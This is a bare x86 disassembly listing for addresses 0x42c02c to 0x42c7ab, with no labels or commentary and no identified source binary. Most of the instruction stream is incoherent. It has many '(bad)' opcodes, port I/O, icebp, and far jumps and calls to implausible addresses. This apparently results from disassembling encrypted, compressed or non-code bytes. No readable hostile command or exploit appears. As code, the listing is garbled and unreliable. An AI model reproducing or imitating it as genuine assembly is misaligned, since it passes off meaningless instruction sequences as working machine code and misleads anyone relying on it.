  42c02c:	add    eax,0x4572aa
  42c031:	pop    edi
  42c032:	leave  
  42c033:	add    ecx,DWORD PTR [eax*2-0x3c13a1ab]
  42c03a:	in     al,dx
  42c03b:	mov    eax,edi
  42c03d:	xor    eax,0xf8008520
  42c043:	mov    DWORD PTR [ebp-0x14],0xf89c8534
  42c04a:	mov    eax,DWORD PTR [ebp-0x77]
  42c04d:	xor    al,0xf8
  42c04f:	pushf  
  42c050:	inc    ebp
  42c051:	(bad)  
  42c052:	cmp    eax,0x56869ce8
  42c057:	clc    
  42c058:	mov    edi,0x8518e4ec
  42c05e:	jmp    0xf056:0x8b457df8
  42c065:	push   edi
  42c066:	push   edi
  42c067:	push   ecx
  42c068:	push   ecx
  42c069:	push   edi
  42c06a:	xor    eax,esi
  42c06c:	mov    edx,0x32729e
  42c071:	add    ecx,eax
  42c073:	mov    edx,edi
  42c075:	clc    
  42c076:	retf   0xaf45
  42c079:	cmp    eax,0xc78b9ceb
  42c07e:	clc    
  42c07f:	cld    
  42c080:	jne    0x42c09a
  42c082:	xor    ebp,edx
  42c084:	xor    eax,DWORD PTR [ebp+0x3]
  42c087:	or     BYTE PTR [ebx],al
  42c089:	add    BYTE PTR [ebp-0x7747475],al
  42c08f:	hlt    
  42c090:	dec    ebp
  42c091:	dec    ebp
  42c092:	je     0x42c0c7
  42c094:	xor    esi,DWORD PTR [ebx]
  42c096:	xor    eax,DWORD PTR [ebx]
  42c098:	add    eax,DWORD PTR [ebx]
  42c09a:	add    ecx,DWORD PTR [edi]
  42c09c:	rol    ecx,cl
  42c09e:	mov    esi,DWORD PTR [ecx]
  42c0a0:	in     al,dx
  42c0a1:	inc    ebp
  42c0a2:	enter  0xca2b,0x33
  42c0a6:	icebp  
  42c0a7:	mov    DWORD PTR [edx],ecx
  42c0a9:	clc    
  42c0aa:	lock pop ebp
  42c0ac:	enter  0xf2e8,0xfe
  42c0b0:	retf   0xeeff
  42c0b3:	inc    ebp
  42c0b4:	jne    0x42c041
  42c0b6:	mov    edi,eax
  42c0b8:	cld    
  42c0b9:	dec    ebp
  42c0ba:	enter  0xbc89,0x8d
  42c0be:	sahf   
  42c0bf:	sti    
  42c0c0:	xor    bh,bh
  42c0c2:	mov    eax,DWORD PTR [ebp-0xc]
  42c0c5:	mov    esi,DWORD PTR [ebp-0x4]
  42c0c8:	xor    eax,esi
  42c0ca:	xor    eax,DWORD PTR [ebx+ebp*1+0x76323b9e]
  42c0d1:	mov    DWORD PTR [ebx-0x76ba0704],ecx
  42c0d7:	mov    ecx,DWORD PTR [ebx-0x3631070c]
  42c0dd:	(bad)  
  42c0de:	push   ebp
  42c0df:	shr    esp,0x4d
  42c0e2:	in     al,dx
  42c0e3:	cmp    eax,DWORD PTR [esi+esi*2]
  42c0e6:	add    BYTE PTR [ebx-0x39ca1bbb],cl
  42c0ec:	pushf  
  42c0ed:	mov    edi,0x85c7f445
  42c0f3:	call   0xf88847f0
  42c0f8:	xor    eax,0x53619cdb
  42c0fd:	dec    ebp
  42c0fe:	inc    ebp
  42c0ff:	mov    esi,DWORD PTR [esi]
  42c101:	clc    
  42c102:	pushf  
  42c103:	into   
  42c104:	mov    ecx,edi
  42c106:	in     al,dx
  42c107:	call   0x8b4b06ca
  42c10c:	pop    es
  42c10d:	or     BYTE PTR [ebx],dh
  42c10f:	or     BYTE PTR [edi+0x8a724d],bh
  42c115:	or     eax,edi
  42c117:	push   ebp
  42c118:	inc    ebp
  42c119:	cmpxchg8b (bad)
  42c11a:	(bad)  
  42c11b:	leave  
  42c11c:	loopne 0x42c0e8
  42c11e:	test   DWORD PTR [ebp-0x8],ecx
  42c121:	mov    eax,DWORD PTR [ebp-0x18]
  42c124:	aad    0x55
  42c126:	xlat   BYTE PTR ds:[ebx]
  42c127:	xor    eax,edi
  42c129:	add    esi,eax
  42c12b:	and    eax,DWORD PTR [eax]
  42c12d:	mov    eax,DWORD PTR [eax]
  42c12f:	(bad)  
  42c130:	leave  
  42c131:	sti    
  42c132:	inc    ebp
  42c133:	dec    DWORD PTR [ebx-0x39cc13ab]
  42c139:	mov    esi,ecx
  42c13b:	clc    
  42c13c:	(bad)  
  42c13d:	dec    ebp
  42c13e:	iret   
  42c13f:	xor    ebp,DWORD PTR [edi-0x74f71473]
  42c145:	jb     0x42c143
  42c147:	add    bh,al
  42c149:	inc    ebp
  42c14a:	(bad)  
  42c14b:	mov    eax,DWORD PTR [ebp-0xc]
  42c14e:	(bad)  
  42c14f:	xabort 0x62
  42c152:	loopne 0x42c121
  42c154:	jmp    FWORD PTR [ebx]
  42c156:	mov    DWORD PTR [ebx],eax
  42c158:	clc    
  42c159:	lock inc ebp
  42c15b:	dec    ebp
  42c15c:	mov    ecx,DWORD PTR [ebx+0x4d84ecfc]
  42c162:	loopne 0x42c197
  42c164:	inc    DWORD PTR [ebx]
  42c166:	mov    edi,DWORD PTR [ebx]
  42c168:	hlt    
  42c169:	jne    0x42c1b8
  42c16b:	mov    esi,DWORD PTR [ebx]
  42c16d:	in     al,0x8d
  42c16f:	dec    ebp
  42c170:	or     BYTE PTR [ebx],dh
  42c172:	jb     0x42c177
  42c174:	add    BYTE PTR [edi+0x45],bl
  42c177:	xor    ecx,DWORD PTR [ebx+0x4dc2e85b]
  42c17d:	add    BYTE PTR [ebx],dh
  42c17f:	mov    esi,DWORD PTR [ebx]
  42c181:	mov    ebp,DWORD PTR [ebx]
  42c183:	sbb    BYTE PTR [ebx-0x377403b3],cl
  42c189:	nop
  42c18a:	mov    ecx,0x338b4500
  42c18f:	add    DWORD PTR [ebx],0x70
  42c192:	mov    DWORD PTR [esi-0x8],edx
  42c195:	jne    0x42c1dc
  42c197:	mov    esi,DWORD PTR [esi]
  42c199:	push   edi
  42c19a:	pushf  
  42c19b:	push   edi
  42c19c:	mov    edx,DWORD PTR [ecx-0x15]
  42c19f:	xor    ecx,DWORD PTR [ebx+0x4572e0bb]
  42c1a5:	add    BYTE PTR [ebx],dh
  42c1a7:	retf   
  42c1a8:	add    edx,ecx
  42c1aa:	ror    DWORD PTR [edi],cl
  42c1ac:	mov    DWORD PTR ds:0x7f452dfc,ebp
  42c1b2:	mov    ch,dl
  42c1b4:	mov    BYTE PTR [eax+0xb],dh
  42c1b7:	fimul  WORD PTR [ebp+0x0]
  42c1ba:	mov    ecx,DWORD PTR [ebx+0x55b608f8]
  42c1c0:	xor    esi,DWORD PTR [ebx]
  42c1c2:	mov    DWORD PTR [ebx],esi
  42c1c4:	or     BYTE PTR [ebx],al
  42c1c6:	dec    ebp
  42c1c7:	add    ecx,DWORD PTR [ebx-0x318af7c5]
  42c1cd:	or     edi,0x8c64ca9e
  42c1d3:	out    dx,eax
  42c1d4:	loopne 0x42c1eb
  42c1d6:	(bad)  
  42c1d7:	jmp    0x13ec667
  42c1dc:	retf   0x4d4d
  42c1df:	xor    ecx,DWORD PTR [ebx-0x31c40bfd]
  42c1e5:	je     0x3243608f
  42c1eb:	mov    ecx,DWORD PTR [ecx+0x45450818]
  42c1f1:	mov    DWORD PTR [ebx],esi
  42c1f3:	sbb    BYTE PTR [ecx-0x7472b3],bh
  42c1f9:	mov    eax,ecx
  42c1fb:	fmul   DWORD PTR [ebp+0x45]
  42c1fe:	mov    DWORD PTR ds:0xba459cf0,esi
  42c204:	mov    eax,DWORD PTR [ebp+0x55c6f8f0]
  42c20a:	(bad)  
  42c20b:	mov    ecx,eax
  42c20d:	sbb    BYTE PTR [ecx-0x7474babb],dl
  42c213:	sbb    al,bh
  42c215:	add    dh,0x1
  42c218:	mov    DWORD PTR [eax],0x4dc1005e
  42c21e:	leave  
  42c21f:	mov    eax,DWORD PTR [eax+ebx*1]
  42c222:	push   ebp
  42c223:	mov    esp,ebp
  42c225:	add    DWORD PTR [ebp+0x0],eax
  42c228:	mov    ecx,DWORD PTR [ecx]
  42c22a:	or     BYTE PTR [eax-0x80],cl
  42c22d:	mov    DWORD PTR [ecx],eax
  42c22f:	or     al,0x0
  42c231:	inc    ebp
  42c232:	add    BYTE PTR [ebx],dh
  42c234:	in     al,dx
  42c235:	add    edx,DWORD PTR [ebx-0x77]
  42c238:	mov    esi,esp
  42c23a:	adc    BYTE PTR [ebp+0x16],al
  42c23d:	xor    edi,DWORD PTR [edi+0x7890803]
  42c243:	adc    al,0xcf
  42c245:	inc    ebp
  42c246:	sahf   
  42c247:	mov    esi,DWORD PTR [edx]
  42c249:	push   eax
  42c24a:	add    ebp,eax
  42c24c:	cmp    ecx,DWORD PTR [ecx+0x4581d075]
  42c252:	sahf   
  42c253:	mov    esp,DWORD PTR [eax+edi*1+0x42]
  42c257:	dec    ebp
  42c258:	fwait
  42c259:	dec    eax
  42c25a:	jmp    0xcdc6a0
  42c25f:	or     al,0x4d
  42c261:	sbb    BYTE PTR [ebx-0x3074f3c0],cl
  42c267:	or     al,0xd7
  42c269:	dec    ecx
  42c26a:	retf   
  42c26b:	dec    eax
  42c26c:	rcl    eax,cl
  42c26e:	retf   0xfc8
  42c271:	inc    ebp
  42c272:	or     eax,0x7f382d8b
  42c277:	sar    esp,0x3
  42c27a:	lahf   
  42c27b:	inc    eax
  42c27c:	mov    ebp,0x8b180089
  42c281:	inc    ebp
  42c282:	or     BYTE PTR [ebx],dh
  42c284:	iret   
  42c285:	add    ecx,ebx
  42c287:	mov    ecx,eax
  42c289:	adc    al,0x84
  42c28b:	inc    ebp
  42c28c:	add    al,0x33
  42c28e:	add    BYTE PTR [ebx],al
  42c290:	dec    ebp
  42c291:	mov    DWORD PTR [ecx+0x4d45dc14],ecx
  42c297:	mov    ecx,DWORD PTR [ebx+0x6c714d4]
  42c29d:	ret    
  42c29e:	inc    ebp
  42c29f:	add    edi,eax
  42c2a1:	push   ebp
  42c2a2:	or     bh,al
  42c2a4:	test   DWORD PTR [eax+edi*8],edx
  42c2a7:	test   DWORD PTR [eax+edi*8],esi
  42c2aa:	pushf  
  42c2ab:	inc    ebp
  42c2ac:	mov    DWORD PTR [edx],esi
  42c2ae:	lock pushf 
  42c2b0:	inc    ebp
  42c2b1:	(bad)  
  42c2b2:	mov    DWORD PTR [eax+ebx*1],edx
  42c2b5:	test   DWORD PTR [ebp-0x8],eax
  42c2b8:	mov    eax,DWORD PTR [ebp-0x70]
  42c2bb:	mov    eax,DWORD PTR [eax]
  42c2bd:	sbb    BYTE PTR [ebx-0x2b3c7639],cl
  42c2c3:	scas   eax,DWORD PTR es:[edi]
  42c2c4:	dec    ebp
  42c2c5:	mov    ecx,DWORD PTR [ebx+0x559008]
  42c2cb:	xor    ecx,DWORD PTR [ebx+0x3c11038d]
  42c2d1:	jb     0x42c320
  42c2d3:	add    BYTE PTR [ebx-0x387cf73f],cl
  42c2d9:	add    eax,ebx
  42c2db:	add    BYTE PTR [ebp+0x45],al
  42c2de:	mov    esi,DWORD PTR [ebx]
  42c2e0:	or     BYTE PTR [ebx],al
  42c2e2:	(bad)  
  42c2e3:	mov    ebx,eax
  42c2e5:	adc    al,0x45
  42c2e7:	inc    ebp
  42c2e8:	mov    eax,DWORD PTR [ebx]
  42c2ea:	or     al,0xdc
  42c2ec:	inc    eax
  42c2ed:	inc    ebp
  42c2ee:	cmp    edi,0xc
  42c2f1:	hlt    
  42c2f2:	inc    ebp
  42c2f3:	jne    0x42c280
  42c2f5:	mov    ecx,DWORD PTR [esp+ecx*1]
  42c2f8:	inc    eax
  42c2f9:	bound  ecx,QWORD PTR [ebx-0x7a76f301]
  42c2ff:	clc    
  42c300:	push   esp
  42c301:	inc    ebp
  42c302:	inc    ebp
  42c303:	cmp    eax,0x8b8b9c74
  42c308:	cmp    al,ah
  42c30a:	dec    ebp
  42c30b:	(bad)  
  42c30c:	mov    eax,ebx
  42c30e:	push   esp
  42c30f:	(bad)  
  42c310:	idiv   DWORD PTR [eax-0x87417dd]
  42c316:	or     al,0xff
  42c318:	inc    eax
  42c319:	inc    ebp
  42c31a:	add    eax,DWORD PTR [ebp-0x74748b15]
  42c320:	push   esp
  42c321:	loopne 0x42c368
  42c323:	(bad)  
  42c324:	mov    eax,ebx
  42c326:	or     bh,bh
  42c328:	xbegin 0x508808f1
  42c32e:	mov    ebx,esp
  42c330:	or     bh,bh
  42c332:	(bad)  
  42c333:	mov    eax,ebx
  42c335:	hlt    
  42c336:	inc    ebp
  42c337:	inc    ebp
  42c338:	mov    ecx,DWORD PTR [ebx+0x4d4de008]
  42c33e:	xor    ebp,DWORD PTR [ebx]
  42c340:	add    ecx,DWORD PTR [ecx+0x4589e089]
  42c346:	adc    al,0x8b
  42c348:	inc    ebp
  42c349:	clc    
  42c34a:	xor    eax,DWORD PTR [eax-0x64]
  42c34d:	add    eax,edi
  42c34f:	or     al,0x14
  42c351:	dec    ebp
  42c352:	test   DWORD PTR [ebx],edi
  42c354:	clc    
  42c355:	jb     0x42c39c
  42c357:	mov    esi,DWORD PTR [ecx]
  42c359:	clc    
  42c35a:	pushf  
  42c35b:	inc    eax
  42c35c:	mov    ecx,DWORD PTR [ebx+0x414df8f0]
  42c362:	xor    ecx,DWORD PTR [ebx-0x3ef01ffd]
  42c368:	shr    esi,0x4d
  42c36b:	add    BYTE PTR [ebx-0x30002f96],cl
  42c371:	hlt    
  42c372:	mov    WORD PTR [ebp-0x62],es
  42c375:	push   eax
  42c376:	xor    dl,BYTE PTR [ebx+edi*1-0x5347f001]
  42c37d:	test   DWORD PTR [eax],eax
  42c37f:	clc    
  42c380:	mov    eax,DWORD PTR [ebp+0x8]
  42c383:	mov    edi,0x4585c3c8
  42c389:	clc    
  42c38a:	mov    eax,DWORD PTR [ebp+0x18]
  42c38d:	xor    eax,DWORD PTR [ebp-0x64]
  42c390:	mov    edi,eax
  42c392:	hlt    
  42c393:	shl    BYTE PTR [ebp-0x7b],0x8b
  42c397:	clc    
  42c398:	fmul   QWORD PTR [ebp+0x4d]
  42c39b:	mov    eax,ebp
  42c39d:	in     al,dx
  42c39e:	icebp  
  42c39f:	dec    ebp
  42c3a0:	dec    DWORD PTR [ecx+0x4dc7e845]
  42c3a6:	loopne 0x42c331
  42c3a8:	test   eax,edi
  42c3aa:	clc    
  42c3ab:	dec    ebp
  42c3ac:	inc    ebp
  42c3ad:	mov    DWORD PTR [ebx],esi
  42c3af:	in     al,0x3
  42c3b1:	dec    ebp
  42c3b2:	push   eax
  42c3b3:	xor    eax,DWORD PTR [ebp+0x3]
  42c3b6:	push   eax
  42c3b7:	mov    DWORD PTR [eax-0x20],edx
  42c3ba:	push   edi
  42c3bc:	mov    eax,DWORD PTR [eax]
  42c3be:	clc    
  42c3bf:	cmp    eax,0xf84e85c0
  42c3c4:	inc    ebp
  42c3c5:	test   BYTE PTR [ebx],dh
  42c3c7:	add    DWORD PTR [ebx],eax
  42c3c9:	add    BYTE PTR [eax+0x4d],dl
  42c3cc:	jne    0x42c401
  42c3ce:	lea    ecx,[ebx-0x7617fc48]
  42c3d4:	cmc    
  42c3d5:	adc    al,0xff
  42c3d7:	inc    ebp
  42c3d8:	inc    ebp
  42c3d9:	xor    ecx,DWORD PTR [ecx+0x4530e08d]
  42c3df:	jb     0x42c36c
  42c3e1:	add    ah,bl
  42c3e3:	inc    ebp
  42c3e4:	ror    DWORD PTR [ebx+0x4d8bf045],0xf8
  42c3eb:	xor    ecx,DWORD PTR [ebp+0x3]
  42c3ee:	mov    edi,DWORD PTR [ebx]
  42c3f0:	adc    BYTE PTR [ebp+0x41],dh
  42c3f3:	mov    ecx,DWORD PTR [ebx-0x37381ff8]
  42c3f9:	ret    
  42c3fa:	push   ss
  42c3fb:	push   0x45
  42c3fd:	lea    ecx,[ebx+0x4de80cac]
  42c403:	cli    
  42c404:	add    edi,edi
  42c406:	or     BYTE PTR [ebp+0x4d],al
  42c409:	mov    ebp,DWORD PTR [ebx]
  42c40b:	xor    ebp,ecx
  42c40d:	mov    al,BYTE PTR [edx]
  42c40f:	add    eax,0xc7200
  42c414:	jne    0x42c463
  42c416:	lea    esi,[ebx]
  42c418:	lods   al,BYTE PTR ds:[esi]
  42c419:	psubsb mm0,mm0
  42c41c:	cmc    
  42c41d:	retf   
  42c41e:	inc    ecx
  42c420:	xor    eax,0x89019c84
  42c425:	add    ah,cl
  42c427:	inc    ebp
  42c428:	inc    ebp
  42c429:	mov    esi,DWORD PTR [ebx+esi*1]
  42c42c:	pushf  
  42c42d:	mov    al,bh
  42c42f:	add    eax,0x8572c4
  42c434:	clc    
  42c435:	dec    ebp
  42c436:	inc    ebp
  42c437:	xor    esi,DWORD PTR [edx]
  42c439:	setl   al
  42c43c:	(bad)  
  42c43d:	retf   
  42c43e:	int3   
  42c43f:	ror    DWORD PTR [ebp-0x7c],0x8d
  42c443:	add    eax,ecx
  42c445:	add    BYTE PTR [ebp+0x45],cl
  42c448:	lea    ecx,[ebx-0x75b2cc3c]
  42c44e:	lea    eax,ds:0x4d72c0
  42c454:	mov    ecx,DWORD PTR [ebp+0x8]
  42c457:	xor    ecx,edi
  42c459:	bswap  ebx
  42c45b:	ror    BYTE PTR [ebp-0x35],0xe9
  42c45f:	rol    DWORD PTR [ecx],0x84
  42c462:	add    BYTE PTR [ecx],al
  42c464:	xor    eax,DWORD PTR [eax]
  42c466:	pushf  
  42c467:	inc    ebp
  42c468:	jnp    0x8a42f86c
  42c46e:	mov    eax,DWORD PTR ds:0xcf72f0
  42c474:	lock dec ebp
  42c476:	retf   
  42c477:	xor    ecx,DWORD PTR [ebp+0xf]
  42c47a:	mov    eax,eax
  42c47c:	loopne 0x42c449
  42c47e:	test   ecx,0x19e8484
  42c484:	xor    al,BYTE PTR [eax]
  42c486:	mov    DWORD PTR [ebp-0x20],eax
  42c489:	mov    eax,DWORD PTR [ebp+0x33]
  42c48c:	mov    ecx,DWORD PTR [edx+0x72c705e0]
  42c492:	ret    
  42c493:	add    al,cl
  42c495:	dec    ebp
  42c496:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  42c49c:	add    ecx,DWORD PTR ds:0xc7250
  42c4a2:	inc    ebp
  42c4a3:	rcl    DWORD PTR [eax+0x4d],0x5f
  42c4a7:	mov    edi,edi
  42c4a9:	xor    ecx,DWORD PTR [ebx+0xdec8a]
  42c4af:	jb     0x42c478
  42c4b1:	add    BYTE PTR [ecx+eax*8-0x74cdb2b6],al
  42c4b8:	mov    esi,DWORD PTR [ebx]
  42c4ba:	or     BYTE PTR [edx+0x72b60dcf],cl
  42c4c0:	add    eax,DWORD PTR [eax]
  42c4c2:	cmp    ecx,eax
  42c4c4:	jne    0x42c542
  42c4ca:	mov    eax,DWORD PTR [ebp-0x18]
  42c4cd:	mov    eax,DWORD PTR [eax]
  42c4cf:	xor    eax,edi
  42c4d1:	mov    al,BYTE PTR [ebp+eax*1+0x32724a]
  42c4d8:	mov    ecx,DWORD PTR [ebp+0x8]
  42c4db:	mov    ecx,edi
  42c4dd:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  42c4e3:	jb     0x42c4f4
  42c4e5:	add    BYTE PTR [eax-0x3f],bl
  42c4e8:	add    BYTE PTR [ebp-0x75],cl
  42c4eb:	mov    edi,eax
  42c4ed:	xor    eax,DWORD PTR [eax]
  42c4ef:	mov    al,bh
  42c4f1:	or     eax,0x4a7284
  42c4f6:	xor    al,cl
  42c4f8:	mov    ecx,DWORD PTR [ebp+0x8]
  42c4fb:	mov    ecx,edi
  42c4fd:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  42c503:	jb     0x42c514
  42c505:	add    BYTE PTR [eax],bh
  42c507:	enter  0x8500,0x8b
  42c50b:	add    ah,ah
  42c50d:	add    BYTE PTR [eax],al
  42c50f:	inc    ebp
  42c510:	(bad)  
  42c511:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a4a]
  42c518:	mov    esi,DWORD PTR [edx+0x8]
  42c51b:	add    bh,cl
  42c51d:	dec    ebp
  42c51e:	mov    dh,0x8b
  42c520:	add    esi,DWORD PTR [ebx]
  42c522:	cmp    ecx,DWORD PTR [edx+0x72180d0f]
  42c528:	add    BYTE PTR [eax],al
  42c52a:	mov    eax,ecx
  42c52c:	call   0xc7cdc57e
  42c531:	xor    eax,DWORD PTR [edx+ecx*4+0x72320d4a]
  42c538:	mov    eax,DWORD PTR [eax]
  42c53a:	in     al,dx
  42c53b:	ror    DWORD PTR [ecx],0x4d
  42c53e:	iret   
  42c53f:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4a]
  42c546:	xor    dh,BYTE PTR [edx-0x75]
  42c549:	add    al,bh
  42c54b:	enter  0x5009,0xcf
  42c54f:	inc    ebp
  42c550:	mov    WORD PTR [ebx-0x75cdccb6],cs
  42c556:	or     al,BYTE PTR ds:0xec728b
  42c55c:	or     DWORD PTR [ebp-0x31],ecx
  42c55f:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4e]
  42c566:	cmp    dh,BYTE PTR [edx+0xf]
  42c569:	add    ah,dl
  42c56b:	rol    DWORD PTR [eax],0x4d
  42c56e:	mov    ecx,DWORD PTR [ebx-0x75ffcc08]
  42c574:	(bad)  
  42c575:	or     eax,0x4a7284
  42c57a:	xor    al,cl
  42c57c:	mov    ecx,DWORD PTR [ebp-0x18]
  42c57f:	mov    ecx,DWORD PTR [ecx]
  42c581:	xor    ecx,edi
  42c583:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724a]
  42c58a:	xor    cl,al
  42c58c:	mov    edx,DWORD PTR [eax]
  42c58e:	in     al,0x45
  42c590:	or     DWORD PTR [eax-0x31],edx
  42c593:	mov    ds:0x8b4aff8c,eax
  42c598:	xor    dh,BYTE PTR [edx+ecx*1-0x17f5743f]
  42c59f:	inc    ebp
  42c5a0:	or     DWORD PTR [ebx],esi
  42c5a2:	iret   
  42c5a3:	add    ecx,DWORD PTR [ecx+ecx*4+0x4532144e]
  42c5aa:	cmp    dh,BYTE PTR [ebx]
  42c5ac:	jge    0x7242f642
  42c5b2:	mov    eax,DWORD PTR [eax]
  42c5b4:	in     al,0xc7
  42c5b6:	add    BYTE PTR [ebp-0x39],cl
  42c5b9:	mov    eax,DWORD PTR [esp+edx*1-0x34cd30b6]
  42c5c0:	mov    edx,ecx
  42c5c2:	clc    
  42c5c3:	test   BYTE PTR [ecx],cl
  42c5c5:	std    
  42c5c6:	iret   
  42c5c7:	dec    DWORD PTR [ebp+eax*2+0x14328b4a]
  42c5ce:	xor    al,bh
  42c5d0:	mov    eax,ebx
  42c5d2:	in     al,dx
  42c5d3:	enter  0x1109,0xcf
  42c5d7:	inc    ebp
  42c5d8:	mov    WORD PTR [ebx-0x38cde7b6],cs
  42c5de:	or     al,BYTE PTR [ebx+ecx*4+0x932f89e]
  42c5e5:	jmp    0x42c5b6
  42c5e7:	push   0xffffff8c
  42c5e9:	dec    DWORD PTR [esi-0xc]
  42c5ec:	xor    al,BYTE PTR [ebp+0x3a]
  42c5ef:	push   eax
  42c5f0:	jne    0x42c60c
  42c5f2:	mov    edi,edi
  42c5f4:	in     al,0x8b
  42c5f6:	add    BYTE PTR [eax],cl
  42c5f8:	(bad)  
  42c5f9:	dec    ebp
  42c5fa:	test   BYTE PTR [ebx],dh
  42c5fc:	dec    edx
  42c5fd:	add    esi,DWORD PTR [edx]
  42c5ff:	cmp    ecx,DWORD PTR [ebx+0x98bec74]
  42c605:	or     bh,cl
  42c607:	(bad)  
  42c608:	mov    ebx,es
  42c60a:	dec    edx
  42c60b:	push   0x32
  42c60d:	lea    esi,[edx]
  42c60f:	xchg   esp,eax
  42c610:	mov    ebp,eax
  42c612:	call   0xd041d00f
  42c617:	inc    ebp
  42c618:	mov    WORD PTR [ebx+0x4532184a],es
  42c61e:	or     bh,bh
  42c620:	mov    ebp,DWORD PTR [eax-0x74f68a1c]
  42c626:	iret   
  42c627:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c628:	mov    WORD PTR [ebp+0x4e],es
  42c62b:	push   eax
  42c62c:	xor    bl,dh
  42c62e:	cmp    bh,bh
  42c630:	jne    0x42c5bd
  42c632:	lea    ecx,[eax]
  42c634:	lods   al,BYTE PTR ds:[esi]
  42c635:	dec    ebp
  42c636:	call   0xff46c06e
  42c63b:	cmp    ecx,DWORD PTR [ebp+0x74]
  42c63e:	cmp    ebp,DWORD PTR [edx+0x74]
  42c641:	dec    DWORD PTR [ebx-0x38baf758]
  42c647:	add    eax,ebx
  42c649:	fadd   DWORD PTR [ebp-0x18]
  42c64c:	mov    edi,eax
  42c64e:	lock inc edi
  42c651:	inc    ebp
  42c652:	test   BYTE PTR [ebx+0x832a89e],cl
  42c658:	xor    eax,DWORD PTR [ebp-0x75]
  42c65b:	add    ecx,DWORD PTR [eax]
  42c65d:	sbb    BYTE PTR [ebp+0x45],dl
  42c660:	xor    ecx,DWORD PTR [ebx+0x4d3bf003]
  42c666:	rdpmc  
  42c668:	test   DWORD PTR [ebx],0xc18b0fff
  42c66e:	or     BYTE PTR [ebp+0x4d],cl
  42c671:	mov    esi,DWORD PTR [ebx]
  42c673:	rol    BYTE PTR [ebx],1
  42c675:	iret   
  42c676:	cmp    ecx,DWORD PTR [ebp+esi*2-0xfcd7462]
  42c67d:	cmp    ecx,DWORD PTR [ebp+0xf]
  42c680:	xor    edx,DWORD PTR [edi-0x73]
  42c683:	dec    DWORD PTR [eax]
  42c685:	mov    esi,DWORD PTR [edx+0x10]
  42c688:	add    BYTE PTR [ebp+0x77],al
  42c68b:	mov    DWORD PTR [eax],ebx
  42c68d:	jmp    0x42c704
  42c68f:	or     DWORD PTR [ebp-0x179b6b62],0xff65f3bf
  42c699:	pop    edi
  42c69a:	inc    ebp
  42c69b:	pop    ebx
  42c69c:	mov    eax,edx
  42c69e:	loopne 0x42c6a0
  42c6a0:	(bad)  
  42c6a1:	mov    eax,ebx
  42c6a3:	push   ecx
  42c6a4:	ror    DWORD PTR [ebx+0x4d450813],0x33
  42c6ab:	push   esi
  42c6ac:	add    edi,DWORD PTR [edi+0x7180850]
  42c6b2:	inc    ebp
  42c6b3:	(bad)  
  42c6b4:	push   eax
  42c6b5:	sahf   
  42c6b6:	dec    edi
  42c6b7:	xor    bh,bh
  42c6b9:	add    ecx,DWORD PTR [ebx-0x3f740b77]
  42c6bf:	adc    al,0x89
  42c6c1:	adc    BYTE PTR [ecx+eax*1],0x75
  42c6c5:	add    bh,bh
  42c6c7:	or     BYTE PTR [eax*2-0x6bfc74bb],dl
  42c6ce:	fadd   DWORD PTR [eax]
  42c6d0:	call   0xff46b960
  42c6d5:	cmp    al,0x45
  42c6d7:	dec    ebp
  42c6d8:	mov    ecx,DWORD PTR [ebx+0xc7d8e0]
  42c6de:	ret    
  42c6df:	mov    eax,ecx
  42c6e1:	adc    al,0x11
  42c6e3:	add    al,0x0
  42c6e5:	add    BYTE PTR [ebp+0x0],dh
  42c6e8:	mov    edi,edi
  42c6ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c6eb:	push   eax
  42c6ec:	inc    ebp
  42c6ed:	add    BYTE PTR [eax-0x2f],dl
  42c6f0:	adc    eax,0x8b45ff03
  42c6f5:	xor    edx,esp
  42c6f7:	add    ecx,DWORD PTR [ebp-0x77]
  42c6fa:	add    esp,edi
  42c6fc:	mov    eax,DWORD PTR [ebp-0x58]
  42c6ff:	inc    DWORD PTR [ebp+0x14]
  42c702:	mov    DWORD PTR [ebp+0x18],eax
  42c705:	push   eax
  42c706:	inc    ebp
  42c707:	dec    DWORD PTR [ebx-0x388ae7f4]
  42c70d:	call   0xfff2c1d5
  42c712:	mov    eax,DWORD PTR [ebp+0x8]
  42c715:	mov    edx,DWORD PTR [ebp+0x33]
  42c718:	xor    eax,DWORD PTR [ebx]
  42c71a:	lea    edi,[ebx]
  42c71c:	adc    DWORD PTR [edx+esi*2-0x75],esi
  42c720:	add    BYTE PTR [ecx+eax*8],cl
  42c723:	dec    ebp
  42c724:	xor    BYTE PTR [ebx],0xfc
  42c727:	add    edi,edi
  42c729:	pcmpeqw mm0,QWORD PTR [ebp-0x75]
  42c72d:	mov    eax,ebx
  42c72f:	pop    edi
  42c730:	push   es
  42c731:	leave  
  42c732:	or     dl,BYTE PTR [eax]
  42c734:	xor    eax,0x7fec2d55
  42c739:	in     al,0xec
  42c73b:	adc    DWORD PTR [edx+0x14],0x5e
  42c73f:	xor    eax,0x53149cc9
  42c744:	push   ebp
  42c745:	dec    esp
  42c746:	in     al,dx
  42c747:	or     BYTE PTR [ecx+0x57],dl
  42c74a:	inc    ebp
  42c74b:	inc    ecx
  42c74c:	mov    ecx,DWORD PTR [ecx-0x74a8dbf0]
  42c752:	push   edi
  42c753:	and    al,0x51
  42c755:	mov    edx,0x7be0833
  42c75a:	jb     0x42c756
  42c75c:	add    BYTE PTR [esi+0x30132c6],bl
  42c762:	inc    ebp
  42c763:	mov    DWORD PTR [ebx+0x8b9424],ecx
  42c769:	or     al,0x8b
  42c76b:	jl     0x42c6f8
  42c76d:	sbb    al,0x14
  42c76f:	dec    ebp
  42c770:	xor    BYTE PTR [ebp+0x1],0x8b
  42c774:	add    BYTE PTR [eax+eax*1],ah
  42c777:	xor    eax,DWORD PTR [ecx-0x75]
  42c77a:	mov    esp,DWORD PTR [esp+edx*1]
  42c77d:	add    ecx,DWORD PTR [ecx+0xca010f]
  42c783:	dec    esp
  42c784:	dec    ecx
  42c785:	adc    BYTE PTR [edx-0x15],ch
  42c788:	push   0x103039
  42c78d:	sbb    al,0x70
  42c78f:	inc    esp
  42c790:	push   0x10
  42c792:	dec    DWORD PTR [ecx+ecx*4+0x18]
  42c796:	mov    eax,edx
  42c798:	or     BYTE PTR [edi+eax*8+0x4532c69e],al
  42c79f:	mov    DWORD PTR [ebx+0x75681024],ecx
  42c7a5:	test   DWORD PTR [ebp+0x530efcf8],ecx
  42c7ab:	jge    0x42c822
